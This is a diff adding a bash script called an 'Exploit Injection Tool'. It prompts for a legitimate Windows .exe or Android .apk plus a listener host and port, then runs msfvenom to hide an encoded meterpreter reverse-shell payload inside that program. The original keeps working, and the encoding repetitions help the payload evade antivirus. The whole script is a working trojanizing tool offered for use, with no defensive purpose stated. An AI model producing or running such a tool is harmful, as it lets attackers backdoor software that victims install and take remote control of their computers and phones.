@@ -1,0 +1,81 @@
+#!/bin/bash
+
+clear
+
+echo $(tput bold)$(tput setaf 3)"#######################################################################"
+echo "#######################################################################"
+echo "####                                                               ####"
+echo "####                     "$(tput setaf 2)"EXPLOIT INJECTION TOOL"$(tput setaf 3)"                    ####"
+echo "####                        "$(tput setaf 2)"By: Galang E.P."$(tput setaf 3)"                        ####"
+echo "####                   "$(tput setaf 2)"Build Date: April 18, 2018"$(tput setaf 3)"                  ####"
+echo "####                                                               ####"
+echo "#######################################################################"
+echo "#######################################################################"
+echo ""
+echo ""
+echo ""$(tput sgr0)$(tput setaf 7)
+echo "#######################################################################"
+echo "#                                                                     #"
+echo "# "$(tput bold)$(tput setaf 6)"Select platform:"$(tput sgr0)"                                                    #"
+echo "#     1) "$(tput bold)$(tput setaf 2)"Windows"$(tput sgr0)"                                                      #"
+echo "#     2) "$(tput bold)$(tput setaf 2)"Android"$(tput sgr0)"                                                      #"
+echo "#     3) "$(tput bold)$(tput setaf 1)"Exit"$(tput sgr0)"                                                         #"
+echo "#                                                                     #"
+echo "#######################################################################"
+echo ""
+echo ""
+read -p "# "$(tput bold)$(tput setaf 2)"Your choice: "$(tput sgr0) choice
+case $choice in
+	1)
+clear
+echo $(tput setaf 1)$(tput bold)"######################################################################"
+echo "######################################################################"
+echo "###                                                                ###"
+echo "###                     "$(tput setaf 2)"WINDOWS EXPLOIT INJECTOR"$(tput setaf 1)"                   ###"
+echo "###                                                                ###"
+echo "######################################################################"
+echo "######################################################################"
+echo ""
+echo ""$(tput sgr0)
+read -p $(tput setaf 3)"  Original file (.exe)         : "$(tput setaf 6) orig_exe
+read -p $(tput setaf 3)"  Listen Host                  : "$(tput setaf 6) lhost
+read -p $(tput setaf 3)"  Listen Port (1-65535)        : "$(tput setaf 6) lport
+read -p $(tput setaf 3)"  Time(s) to encode            : "$(tput setaf 6) iteration
+read -p $(tput setaf 3)"  Save injected exe to         : "$(tput setaf 6) saveto
+echo ""$(tput bold)$(tput setaf 2)
+echo ""
+echo "Creating exploit..."
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -e x86/shikata_ga_nai -i $iteration -x $orig_exe -k -f exe LHOST=$lhost LPORT=$lport -o $saveto
+echo ""$(tput sgr0)
+	;;
+	2)
+clear
+echo $(tput setaf 1)$(tput bold)"######################################################################"
+echo "######################################################################"
+echo "###                                                                ###"
+echo "###                     "$(tput setaf 2)"ANDROID EXPLOIT INJECTOR"$(tput setaf 1)"                   ###"
+echo "###                                                                ###"
+echo "######################################################################"
+echo "######################################################################"
+echo ""
+echo ""$(tput sgr0)
+read -p $(tput setaf 3)"  Original file (.apk)         : "$(tput setaf 6) orig_apk
+read -p $(tput setaf 3)"  Listen Host                  : "$(tput setaf 6) lhost
+read -p $(tput setaf 3)"  Listen Port (1-65535)        : "$(tput setaf 6) lport
+read -p $(tput setaf 3)"  Time(s) to encode            : "$(tput setaf 6) iteration
+read -p $(tput setaf 3)"  Save injected apk to         : "$(tput setaf 6) saveto
+echo ""$(tput bold)$(tput setaf 2)
+echo ""
+echo "Creating exploit..."
+msfvenom -p android/meterpreter/reverse_tcp -a dalvik --platform android -e x86/shikata_ga_nai -i $iteration -x $orig_apk -k LHOST=$lhost LPORT=$lport -o $saveto
+echo ""$(tput sgr0)
+	;;
+	3)
+clear
+	;;
+	*)
+echo $(tput bold)$(tput setaf 1)"You must select option "$(tput setaf 2)"1"$(tput setaf 1)","$(tput setaf 2)"2"$(tput setaf 1)", or "$(tput setaf 2)"3"$(tput sgr0)
+echo ""
+echo ""
+echo ""
+esac
